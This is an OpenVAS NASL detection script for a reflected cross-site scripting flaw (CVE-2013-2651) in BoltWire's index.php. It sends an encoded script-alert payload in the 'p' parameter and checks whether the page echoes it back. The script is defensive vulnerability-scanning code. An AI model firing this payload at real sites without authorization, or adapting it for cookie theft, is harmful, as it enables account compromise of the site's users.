###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_boltwire_mult_xss_vuln.nasl 5351 2017-02-20 08:03:12Z mwiegand $
#
# BoltWire Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803961";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5351 $");
  script_cve_id("CVE-2013-2651");
  script_bugtraq_id(62907);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-02-20 09:03:12 +0100 (Mon, 20 Feb 2017) $");
  script_tag(name:"creation_date", value:"2013-11-07 16:32:49 +0530 (Thu, 07 Nov 2013)");
  script_name("BoltWire Multiple Cross Site Scripting Vulnerabilities");

  tag_summary =
"This host is installed with BoltWire and is prone to multiple cross-site
scripting vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether
it is able to read the string or not.";

  tag_insight =
'An error exists in the index.php script which fails to properly sanitize
user-supplied input to "p" and "content" parameter before using.';

  tag_impact =
"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials.

Impact Level: Application";

  tag_affected =
"BoltWire version 3.5 and earlier";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/62907");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/87809");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/123558");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2013-10/0033.html");
  script_summary("Check if BoltWire is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";
match = "";
rurl = "/index.php";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80 ;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

list = make_list("", "/bolt", "/boltwire", "/field", "/bolt/field", "/boltwire/field");

## check the possible paths
foreach dir (list)
{
  ## Send and Receive the response
  req = http_get(item:string(dir, rurl), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if(res && "<title>BoltWire: Main</title>" >< res && "Radical Results!" >< res)
  {
    ## Construct the attack request
    url = dir + rurl + '?p=%253Cscript%253Ealert(%2527XSS-TEST%2527)%253B%253C%252Fscript%253E';
    match = "<script>alert\('XSS-TEST'\);</script>";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
           pattern:match))
    {
      report = report_vuln_url( port:port, url:url );
      security_message(port:port, data:url);
      exit(0);
    }
  }
}
